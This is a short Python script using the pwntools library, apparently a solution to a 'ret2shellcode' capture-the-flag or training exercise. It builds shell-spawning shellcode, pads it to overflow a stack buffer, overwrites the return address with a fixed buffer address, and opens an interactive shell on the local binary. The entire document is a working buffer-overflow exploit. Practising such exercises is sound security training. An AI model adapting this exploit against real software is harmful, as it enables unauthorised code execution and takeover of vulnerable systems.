from pwn import *

io = process("./ret2shellcode")
shellcode = asm(shellcraft.sh())
buf2 = 0x0804A080
payload = shellcode + b"A" * 68 + p32(buf2)

io.recvline()
io.sendline(payload)
io.interactive()